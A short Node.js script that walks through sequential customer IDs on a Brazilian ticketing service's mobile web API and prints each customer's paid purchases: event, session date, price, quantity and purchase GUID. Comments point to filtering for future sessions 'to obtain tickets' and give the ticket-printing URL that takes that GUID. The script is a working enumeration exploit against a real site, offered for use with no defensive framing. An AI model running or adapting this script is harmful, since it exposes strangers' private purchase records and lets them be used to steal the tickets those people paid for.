var request = require('request');
var xml2js = require('xml2js').parseString;

var pad = function(num, n){
  return new Array(n - String(num).length+1).join('0') + num;
};

var urlForUserId = function(id) {
  return "https://carrinho.ingresso.com.br/iphone/ws/IngressoService.svc/rest/Lista_Venda_Geral_Cliente?IdCliente="
    + id + "&pagas=true&IdPais=1&versaoAppMovel=2.0.5"
};

var userIdGenerator = function(start){
  var id = parseInt(start, 10) || 1000;
  var max = 9466999;

  return function() {
    if (id > max) return false;
    var result = pad(id, 8);
    id += 1;
    return result;
  };
};

generator = userIdGenerator();

var itv = setInterval(function() {

  var userId = generator();
  if (!userId) {
    clearInterval(itv);
    console.log('done');
    return;
  }

  request(urlForUserId(userId), function(err, resp, body) {
    if (err) console.log(err);


    xml2js(body, function(err, result) {
      if (err) console.log(err);

      var venda = result.TodasVendasResponse.TodasVendasResult[0].Venda;
      venda && venda.forEach(function(venda) {
        venda = venda.$;
        venda.IdCliente = userId;

        var dados = [userId, venda.DataSessao, venda.NmGrupo, venda.NmEvento, venda.ValorIng, venda.QtdIngressos, venda.IdGrVendaGuid];
        // uncomment below if you want to obtain tickets in the future
        // if (venda.DataSessao > '20160415') 
        console.log(dados.join('|'));
      });

    });
  });
}, 100);


// This is the printing URL
// https://carrinho.ingresso.com/br/compra/ingresso/codbarra/cinema/codbarra_novo.asp?id=&idGuid={00000000-0000-0000-0000-000000000000}